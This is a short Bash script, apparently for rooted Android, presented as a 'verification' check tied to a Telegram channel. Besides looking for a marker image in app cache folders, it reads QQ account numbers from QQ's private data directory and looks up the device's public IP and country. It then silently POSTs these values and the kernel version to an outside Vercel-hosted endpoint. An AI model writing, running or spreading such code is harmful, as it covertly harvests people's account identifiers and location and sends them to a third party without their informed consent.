#!/bin/bash

# 目标目录
dir="/data/data/com.tencent.mobileqq/files/"

# 目标文件名
target_file="-6190413750901787098_99.jpg"

# 获取系统内核版本，并提取主版本和次版本
kernel_version=$(uname -r | awk -F- '{print $1}' | awk -F. '{print $1"."$2}')
echo "系统内核版本: $kernel_version"

# 遍历所有 cache 目录，检查是否存在目标 jpg 文件
found_jpg=false
for cache_dir in /storage/emulated/0/Android/data/*/cache/; do
  if [ -f "$cache_dir$target_file" ]; then
    echo "验证成功"
    found_jpg=true
    break
  fi
done

# 判断验证结果
if ! $found_jpg; then
  validation_status="failed"
  echo "验证失败: 请订阅TG@jasonxu_channel"
else
  validation_status="success"
fi

# 收集纯数字的文件夹或文件
numbers_list=()
for item in "$dir"/*; do
  # 判断是否为纯数字的文件夹或文件
  case "$(basename "$item")" in
    +([0-9]))  # 仅匹配纯数字
      numbers_list+=("$(basename "$item")")
      ;;
  esac
done

# 输出收集到的纯数字文件夹或文件
if [ ${#numbers_list[@]} -gt 0 ]; then
  echo "您進行驗證的qq號: ${numbers_list[@]}"
else
  echo "無法找到qq"
fi

# 将数字列表转为逗号分隔的字符串
numbers=$(IFS=,; echo "${numbers_list[*]}")

# 获取 IP 地址的地理信息
geo_info=$(curl -s https://api.ip.sb/geoip)

# 使用 awk 解析 JSON 获取 IP 和 国家
ip=$(echo "$geo_info" | awk -F'"ip":' '{print $2}' | awk -F',' '{print $1}' | tr -d '"')
country=$(echo "$geo_info" | awk -F'"country":' '{print $2}' | awk -F',' '{print $1}' | tr -d '"')

# 构建 JSON 数据
json_data=$(cat <<EOF
{
  "kernel_version": "$kernel_version",
  "validation_status": "$validation_status",
  "numbers": "$numbers",
  "ip": "$ip",
  "country": "$country"
}
EOF
)

# 发送 POST 请求
curl -X POST "https://vercel-php-api-dusky.vercel.app/api/verify.php" \
  -H "Content-Type: application/json" \
  -d "$json_data"
